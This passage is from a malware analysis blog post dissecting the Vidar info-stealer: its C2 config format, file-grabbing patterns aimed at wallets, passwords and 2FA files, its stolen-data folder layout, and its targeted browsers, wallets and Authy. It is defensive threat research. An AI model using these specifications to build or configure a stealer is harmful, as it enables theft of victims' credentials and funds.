data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_c2_decrypted.png?fit=900%2C116&amp;ssl=1" class="alignnone size-full wp-image-498" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_c2_decrypted.png?resize=900%2C116&#038;ssl=1" alt="vidar_c2_decrypted" width="900" height="116" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_c2_decrypted.png?w=976&amp;ssl=1 976w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_c2_decrypted.png?resize=300%2C39&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_c2_decrypted.png?resize=768%2C99&amp;ssl=1 768w" sizes="auto, (max-width: 900px) 100vw, 900px" /></p>
<p>Configs are possible to be extracted easily with the script <a href="https://github.com/Fmk0/scripts/blob/master/izanami.py">izanami.py</a> on my GitHub repository.</p>
<h2>How to understand the config format</h2>
<p>For example, this is default configuration the malware could get from the C2 :</p>
<p><em><span style="color: #000000;">1,1,1,1,1,1,1,1,1,1,250,Default;%DESKTOP%\;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*UTC*.*:*crypt*.*:*key*.*;50;true;movies:music:mp3;</span></em></p>
<p>Each part have the &#8220;;&#8221; in delimiter, so let&#8217;s dig into it</p>
<ul>
<li>First part</li>
</ul>
<table border="0" cellspacing="0">
<colgroup width="85"></colgroup>
<colgroup width="125"></colgroup>
<tbody>
<tr>
<td align="left" height="17">1</td>
<td align="left">Saved password</td>
</tr>
<tr>
<td align="left" height="17">1</td>
<td align="left">Cookies / AutoFill</td>
</tr>
<tr>
<td align="left" height="17">1</td>
<td align="left">Wallet</td>
</tr>
<tr>
<td align="left" height="17">1</td>
<td align="left">Internet History</td>
</tr>
<tr>
<td align="left" height="17">1</td>
<td align="left">??? &#8211;  Supposed to be Skype <strong><span style="color: #ff0000;"><em>(not implemented)</em></span></strong></td>
</tr>
<tr>
<td align="left" height="17">1</td>
<td align="left">??? &#8211; Supposed to be Steam <strong><span style="color: #ff0000;"><em>(not implemented)</em></span></strong></td>
</tr>
<tr>
<td align="left" height="17">1</td>
<td align="left">Telegram</td>
</tr>
<tr>
<td align="left" height="17">1</td>
<td align="left">Screenshot</td>
</tr>
<tr>
<td align="left" height="17">1</td>
<td align="left">Grabber</td>
</tr>
<tr>
<td align="left" height="17">1</td>
<td align="left">???</td>
</tr>
<tr>
<td align="left" height="17">250</td>
<td align="left">Max Size (kb)</td>
</tr>
<tr>
<td align="left" height="17">Default</td>
<td align="left">Name of the profile (also used for archive file into the files repository)</td>
</tr>
</tbody>
</table>
<ul>
<li>Second part</li>
</ul>
<table border="0" cellspacing="0">
<colgroup width="85"></colgroup>
<colgroup width="125"></colgroup>
<tbody>
<tr>
<td align="left" height="17">%DESKTOP %</td>
<td align="left">Selected folder repository where the grabber feature will search recursively (or not) some selected data</td>
</tr>
</tbody>
</table>
<ul>
<li>Third part</li>
</ul>
<p><span style="color: #000000;"><em><strong>*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*UTC*.*:*crypt*.*:*key*.*</strong></em></span></p>
<ul>
<li>Fourth part</li>
</ul>
<table border="0" cellspacing="0">
<colgroup width="85"></colgroup>
<colgroup width="125"></colgroup>
<tbody>
<tr>
<td align="right" height="17">50</td>
<td align="left">Max Size per file (kb)</td>
</tr>
<tr>
<td align="left" height="17">true</td>
<td align="left">Collect Recursively</td>
</tr>
</tbody>
</table>
<ul>
<li>Fifth part:</li>
</ul>
<p><strong><em><span style="color: #000000;">movies:music:mp3;</span></em></strong></p>
<p>This is the exception part, the grabber will avoid those strings if it matches in the files searched recursively in the specific wanted folder.</p>
<p>The setup is quite a mess if we are looking into the code. each option is stored into a byte or dword variable.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="494" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/vidar_config_setup/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_config_setup.png?fit=1354%2C834&amp;ssl=1" data-orig-size="1354,834" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="vidar_config_setup" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_config_setup.png?fit=300%2C185&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_config_setup.png?fit=900%2C555&amp;ssl=1" class="alignnone size-full wp-image-494" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_config_setup.png?resize=900%2C554&#038;ssl=1" alt="vidar_config_setup" width="900" height="554" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_config_setup.png?w=1354&amp;ssl=1 1354w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_config_setup.png?resize=300%2C185&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_config_setup.png?resize=768%2C473&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_config_setup.png?resize=1024%2C631&amp;ssl=1 1024w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_config_setup.png?resize=1100%2C678&amp;ssl=1 1100w" sizes="auto, (max-width: 900px) 100vw, 900px" /></p>
<h2>Folder generation</h2>
<p>To summarize all kind of possibles files/folders that will be generated for the malicious repository is in fact pretty simple :</p>
<pre>\\files                   &lt;- Master folder
\\files\\Autofill         &lt;- Auto-Fill files
\\files\\CC               &lt;- Credit Cards
\\files\\Cookies          &lt;- Cookies
\\files\\Downloads        &lt;- Downloaded data history from browsers
\\files\\Files            &lt;- Profile configs (Archives)
\\files\\History          &lt;- Browser histories
\\files\\Soft             &lt;- Master folder for targeted softwares
\\files\\Soft\\Authy      &lt;- 2FA software
\\files\\Telegram         &lt;- Telegram messages
\\files\\Wallets          &lt;- Cryptomining Wallets
</pre>
<p>Generalist files</p>
<pre>\\files\screenshot.jpg     &lt;- Actual screenshot of the screen
\\files\passwords.txt      &lt;- Passwords consolidated all at once
\\files\\information.txt   &lt;- Snapshot of the computer setup</pre>
<h2>Libraries necessary to grab some data</h2>
<p>Something that I love when I read some malware specs, it&#8217;s when they said that the product could be launched without the necessity to have some runtime libraries or other required software on the machine. But when you dig into the code or just watching some network flow, you can see that the malware is downloading some DLL to be able to do some tasks.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="510" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/meme/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/meme.jpg?fit=686%2C582&amp;ssl=1" data-orig-size="686,582" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="meme" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/meme.jpg?fit=300%2C255&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/meme.jpg?fit=686%2C582&amp;ssl=1" class="  wp-image-510 aligncenter" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/meme.jpg?resize=449%2C380&#038;ssl=1" alt="meme" width="449" height="380" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/meme.jpg?w=686&amp;ssl=1 686w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/meme.jpg?resize=300%2C255&amp;ssl=1 300w" sizes="auto, (max-width: 449px) 100vw, 449px" /></p>
<p>And for this case, they are required during the stealing process of different kind of browsers.</p>
<table border="0" cellspacing="0">
<colgroup span="2" width="85"></colgroup>
<tbody>
<tr>
<td align="left" height="17">freebl3.dll</td>
<td align="left">Freebl Library for the NSS (Mozilla Browser)</td>
</tr>
<tr>
<td align="left" height="17">mozglue.dll</td>
<td align="left">Mozilla Browser Library</td>
</tr>
<tr>
<td align="left" height="17">msvcp140.dll</td>
<td align="left">Visual C++ Runtime 2015</td>
</tr>
<tr>
<td align="left" height="17">nss3.dll</td>
<td align="left">Network System Services Library (Mozilla Browser)</td>
</tr>
<tr>
<td align="left" height="17">softokn3.dll</td>
<td align="left">Mozilla Browser Library</td>
</tr>
<tr>
<td align="left" height="17">vcruntime140.dll</td>
<td align="left">Visual C++ Runtime 2015</td>
</tr>
</tbody>
</table>
<p>They are deleted when the task is done.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="511" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/vidar_deleting_dll/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_deleting_dll.png?fit=585%2C377&amp;ssl=1" data-orig-size="585,377" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="vidar_deleting_dll" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_deleting_dll.png?fit=300%2C193&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_deleting_dll.png?fit=585%2C377&amp;ssl=1" class=" size-full wp-image-511 aligncenter" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_deleting_dll.png?resize=585%2C377&#038;ssl=1" alt="vidar_deleting_dll" width="585" height="377" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_deleting_dll.png?w=585&amp;ssl=1 585w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_deleting_dll.png?resize=300%2C193&amp;ssl=1 300w" sizes="auto, (max-width: 585px) 100vw, 585px" /></p>
<h2>FTP</h2>
<p>List of supported software</p>
<ul>
<li>FileZilla</li>
<li>WinSCP</li>
</ul>
<h2>2FA software</h2>
<p>Something that I found interesting on this malware is that also 2FA software is also targeted, a feature that I considered not seen really in the wild, and pretty sure this will be more and more common in the future. With the multiplication of those kinds of protection. Victims must understand that 2FA is not the ultimate way to protect accounts from hackers, this could be also another door for vulnerabilities 🙂</p>
<p>So with Vidar, the Authy software is targeted&#8230;</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="491" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/vidar_2fa_authy/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_2FA_Authy.png?fit=1882%2C1000&amp;ssl=1" data-orig-size="1882,1000" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="vidar_2FA_Authy" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_2FA_Authy.png?fit=300%2C159&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_2FA_Authy.png?fit=900%2C478&amp;ssl=1" class="alignnone size-full wp-image-491" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_2FA_Authy.png?resize=900%2C478&#038;ssl=1" alt="vidar_2FA_Authy" width="900" height="478" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_2FA_Authy.png?w=1882&amp;ssl=1 1882w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_2FA_Authy.png?resize=300%2C159&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_2FA_Authy.png?resize=768%2C408&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_2FA_Authy.png?resize=1024%2C544&amp;ssl=1 1024w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_2FA_Authy.png?resize=1100%2C584&amp;ssl=1 1100w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_2FA_Authy.png?w=1800&amp;ssl=1 1800w" sizes="auto, (max-width: 900px) 100vw, 900px" /></p>
<p>More specifically the SQLite file on the corresponding application on %APPDATA% repository. It looks like this is the same operating where stealer wants to steal data with software like Discord or Chrome.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="492" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/vidar_2fa_reverse/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_2FA_Reverse.png?fit=627%2C496&amp;ssl=1" data-orig-size="627,496" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="vidar_2FA_Reverse" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_2FA_Reverse.png?fit=300%2C237&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_2FA_Reverse.png?fit=627%2C496&amp;ssl=1" class=" size-full wp-image-492 aligncenter" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_2FA_Reverse.png?resize=627%2C496&#038;ssl=1" alt="vidar_2FA_Reverse" width="627" height="496" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_2FA_Reverse.png?w=627&amp;ssl=1 627w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_2FA_Reverse.png?resize=300%2C237&amp;ssl=1 300w" sizes="auto, (max-width: 627px) 100vw, 627px" /></p>
<p>So guys, be careful with your 2FA software 🙂</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="493" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/vidar_2fa_reviews/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Vidar_2FA_reviews.png?fit=1355%2C305&amp;ssl=1" data-orig-size="1355,305" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Vidar_2FA_reviews" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Vidar_2FA_reviews.png?fit=300%2C68&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Vidar_2FA_reviews.png?fit=900%2C202&amp;ssl=1" class="alignnone size-full wp-image-493" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Vidar_2FA_reviews.png?resize=900%2C203&#038;ssl=1" alt="Vidar_2FA_reviews" width="900" height="203" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Vidar_2FA_reviews.png?w=1355&amp;ssl=1 1355w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Vidar_2FA_reviews.png?resize=300%2C68&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Vidar_2FA_reviews.png?resize=768%2C173&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Vidar_2FA_reviews.png?resize=1024%2C230&amp;ssl=1 1024w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Vidar_2FA_reviews.png?resize=1100%2C248&amp;ssl=1 1100w" sizes="auto, (max-width: 900px) 100vw, 900px" /></p>
<h2>Browsers</h2>
<p>Something interesting to mention, this bad boy is also stealing Tor Browser stuff.</p>
<p>List of supported Browsers</p>
<ul>
<li>360 Browser</li>
<li>Amigo</li>
<li>BlackHawk</li>
<li>Cent Browser</li>
<li>Chedot Browser</li>
<li>Chromium</li>
<li>CocCoc</li>
<li>Comodo Dragon</li>
<li>Cyberfox</li>
<li>Elements Browser</li>
<li>Epic Privacy</li>
<li>Google Chrome</li>
<li>IceCat</li>
<li>Internet Explorer</li>
<li>K-Meleon</li>
<li>Kometa</li>
<li>Maxthon5</li>
<li>Microsoft Edge</li>
<li>Mozilla Firefox</li>
<li>Mustang Browser</li>
<li>Nichrome</li>
<li>Opera</li>
<li>Orbitum</li>
<li>Pale Moon</li>
<li>QIP Surf</li>
<li>QQ Browser</li>
<li>Sputnik</li>
<li>Suhba Browser</li>
<li>Tor Browser</li>
<li>Torch</li>
<li>URAN</li>
<li>Vivaldi</li>
<li>Waterfox</li>
</ul>
<p>Of course, this list could be more important than this if there are some browsers based on chromium repository.</p>
<h2>Messengers/Mailer</h2>
<p>I will not explain here, how it works, but the technique is the same that I&#8217;ve explained <a href="https://fumik0.com/2018/10/15/predator-the-thief-in-depth-analysis-v2-3-5/">in my previous blog post</a>. (Especially for the Telegram part).</p>
<ul>
<li>Bat!</li>
<li>Pidgin</li>
<li>Telegram</li>
<li>Thunderbird</li>
</ul>
<h2>Wallets</h2>
<ul>
<li>Anoncoin</li>
<li>BBQCoin</li>
<li>Bitcoin</li>
<li>DashCore</li>
<li>DevCoin</li>
<li>DigitalCoin</li>
<li>Electron Cash</li>
<li>ElectrumLTC</li>
<li>Ethereum</li>
<li>Exodus</li>
<li>FlorinCoin</li>
<li>FrancoCoin</li>
<li>JAXX</li>
<li>Litecoin</li>
<li>MultiDoge</li>
<li>TerraCoin</li>
<li>YACoin</li>
<li>Zcash</li>
</ul>
<p>Of course, this list could change if the customer added some additional files to search on specific areas on the victim machine.</p>
<h2>Grabber</h2>
<p>The grabber feature is by far, the most complicated feature of the malware and what he looks to be really different from Arkei, in term of implementation.</p>
<p>So first of all, it will skip or not the grabber feature by checking in config file downloaded, if this is activated. Preparing the strings for creating the folder path and when all is set <span style="color: #0000ff;"><strong><em>func_grabber</em></strong></span> could be used.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="499" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/vidar_grabber_01/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_grabber_01.png?fit=419%2C835&amp;ssl=1" data-orig-size="419,835" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="vidar_grabber_01" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_grabber_01.png?fit=151%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_grabber_01.png?fit=419%2C835&amp;ssl=1" class=" size-full wp-image-499 aligncenter" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_grabber_01.png?resize=419%2C835&#038;ssl=1" alt="vidar_grabber_01" width="419" height="835" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_grabber_01.png?w=419&amp;ssl=1 419w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_grabber_01.png?resize=151%2C300&amp;ssl=1 151w" sizes="auto, (max-width: 419px) 100vw, 419px" /></p>
<p>When inspecting the <span style="color: #0000ff;"><em><strong>func_grabber</strong></em></span>, I was not prepared to have this :</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="500" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/vidar_grabber_02/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_grabber_02.png?fit=314%2C865&amp;ssl=1" data-orig-size="314,865" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="vidar_grabber_02" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_grabber_02.png?fit=109%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_grabber_02.png?fit=314%2C865&amp;ssl=1" class=" size-full wp-image-500 aligncenter" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_grabber_02.png?resize=314%2C865&#038;ssl=1" alt="vidar_grabber_02" width="314" height="865" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_grabber_02.png?w=314&amp;ssl=1 314w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_grabber_02.png?resize=109%2C300&amp;ssl=1 109w" sizes="auto, (max-width: 314px) 100vw, 314px" /></p>
<p>By far, when I saw this, I was not really happy to reverse this. I mean, I know I was falling in some unexpected allocated memory into my brain. I had all the magnificent stuff that all malware reverser love (or not at all) :</p>
<ul>
<li>Weird conditions come out the blue.</li>
<li>Calling function that will call other functions like Russian wooden dolls</li>
<li>API calls</li>
<li>etc&#8230;</li>
</ul>
<p>But if we are watching these at a macro view, it&#8217;s, in fact, easier than it looks like. I will just show just one example.</p>
<p>So in the example below, if the string %APPDATA% is present in the config downloaded from the C2. it will enter into the function and will start a bunch of verifications. Until entering into the most important one called <em><strong><span style="color: #0000ff;">func_VidarSearchFile</span></strong></em></p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="502" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/vidar_grabber_03/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_grabber_03.png?fit=425%2C826&amp;ssl=1" data-orig-size="425,826" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="vidar_grabber_03" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_grabber_03.png?fit=154%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_grabber_03.png?fit=425%2C826&amp;ssl=1" class=" size-full wp-image-502 aligncenter" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_grabber_03.png?resize=425%2C826&#038;ssl=1" alt="vidar_grabber_03" width="425" height="826" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_grabber_03.png?w=425&amp;ssl=1 425w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_grabber_03.png?resize=154%2C300&amp;ssl=1 154w" sizes="auto, (max-width: 425px) 100vw, 425px" /></p>
<p>After the process will remain almost the same for each scenario.</p>
<p>This is at least, all the repositories available in the grabber feature :</p>
<ul>
<li>%ALL_DRIVES% (<a href="https://docs.microsoft.com/en-us/windows/desktop/api/fileapi/nf-fileapi-getdrivetypea">GetDriveTypeA</a> Necessary)</li>
<li>%APPDATA%</li>
<li>%C%</li>
<li>%D%</li>
<li>%DESKTOP%</li>
<li>%DOCUMENTS%</li>
<li>%DRIVE_FIXED%</li>
<li>%DRIVE_REMOVABLE%</li>
<li>%LOCALAPPDATA%</li>
<li>%USERPROFILE%</li>
</ul>
<h2>Screenshot</h2>
<p>The generation of the screenshot is easy to understand :</p>
<ul>
<li>First <a href="https://docs.microsoft.com/en-us/windows/desktop/api/gdiplusinit/nf-gdiplusinit-gdiplusstartup">GdiplusStartup</a> function is called to initialize the Windows GDI+</li>
<li>Then an alternative to GetDeviceCaps is called for getting the height of the screen on the display monitor with the value SM_CYSCREEN (1) with <a href="https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-getsystemmetrics">GetSystemMetrics</a> this will be the same thing with SM_CXSCREEN (0) for the width.</li>
</ul>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="483" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/vidar_screenshot_01/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_screenshot_01.png?fit=480%2C361&amp;ssl=1" data-orig-size="480,361" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="vidar_screenshot_01" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_screenshot_01.png?fit=300%2C226&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_screenshot_01.png?fit=480%2C361&amp;ssl=1" class=" size-full wp-image-483 aligncenter" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_screenshot_01.png?resize=480%2C361&#038;ssl=1" alt="vidar_screenshot_01" width="480" height="361" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_screenshot_01.png?w=480&amp;ssl=1 480w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_screenshot_01.png?resize=300%2C226&amp;ssl=1 300w" sizes="auto, (max-width: 480px) 100vw, 480px" /></p>
<ul>
<li>Now, it needs a DC object for creating a compatible bitmap necessary to generate our image by selecting the windows DC into the compatible memory DC and using a Bit Block API function to transfer the data. When all is done, it will enter into <span style="color: #0000ff;"><em><strong>func_GdipSaveImageToFile</strong></em></span></li>
</ul>
